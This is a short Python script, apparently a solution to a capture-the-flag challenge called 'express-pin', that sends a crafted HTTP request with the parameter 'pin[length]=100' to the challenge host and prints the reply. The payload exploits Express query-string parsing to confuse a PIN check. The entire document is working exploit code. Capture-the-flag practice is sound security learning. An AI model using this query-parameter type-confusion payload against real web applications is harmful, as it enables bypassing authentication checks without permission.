import socket, ssl

host = ("helsectf2025-42694257c6fdb3976dd6-express-pin.chals.io", 443)
# host = ("localhost", 3000)

pin = b"0"
request = b"GET /?pin[length]=100\r\n\r\n"

# Sending
print("> " + request.decode().replace("\n", "\n> "))

# Depending on local testing or external
if host[1] == 443:
    context = ssl.create_default_context()
    s = socket.create_connection(host)
    ssl_sock = context.wrap_socket(s, server_hostname=host[0])
    ssl_sock.sendall(request)
    response = ssl_sock.recv(4096)
    ssl_sock.close()
else:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(host)
    s.sendall(request)
    response = s.recv(4096)
    s.close()

# Receiving
print("> " + response.decode().replace("\n", "\n> "))